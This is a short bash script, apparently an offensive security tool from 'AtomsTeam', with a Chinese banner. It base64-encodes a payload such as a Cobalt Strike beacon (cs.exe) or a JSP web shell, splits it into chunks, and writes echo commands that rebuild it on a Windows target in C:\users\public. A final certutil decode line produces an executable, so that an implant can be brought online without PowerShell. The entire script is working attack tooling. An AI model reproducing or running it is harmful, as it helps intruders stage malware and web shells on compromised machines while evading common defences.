#!/bin/bash

if [ $# -ne 2 ]; then
    echo "
        _______           _                   _______                   
     /\|__   __|     /\  | |                 |__   __|                  
    /  \  | |______ /  \ | |_ ___  _ __ ___  ___| | ___  __ _ _ __ ___  
   / /\ \ | |______/ /\ \| __/ _ \| '_ \` _ \/ __| |/ _ \/ _\` | '_ \` _ \ 
  / ____ \| |     / ____ \ || (_) | | | | | \__ \ |  __/ (_| | | | | | |
 /_/    \_\_|    /_/    \_\__\___/|_| |_| |_|___/_|\___|\__,_|_| |_| |_|
公众号：AtomsTeam
作者：狩猎(huntingsec)
针对无powershell上线方式，编码分割整合命令


使用方法: ./AT-ess.sh 文件路径 切割份数
例子：
./AT-ess.sh cs.exe 20
./AT-ess.sh shell.jsp 20
"
    exit 1
fi

file_path="$1"   # 文件路径
num_parts="$2"   # 切割份数

cat $file_path|base64|tr '\n' ' '|sed 's/ //g' > b64.txt
split -n $num_parts --additional-suffix=.attack  b64.txt
ls|xargs -n1|grep ".attack" > filename.txt
for i in $(cat filename.txt);do cat $i|sed 's/^/echo /g'|sed 's/$/ >>C:\\users\\public\\r.txt\n\n/g'>> command.txt;done
rm -rf filename.txt *.attack
echo "certutil.exe -decode c:\users\public\r.txt c:\users\public\r.exe" >> command.txt
echo "命令已保存在command.txt中"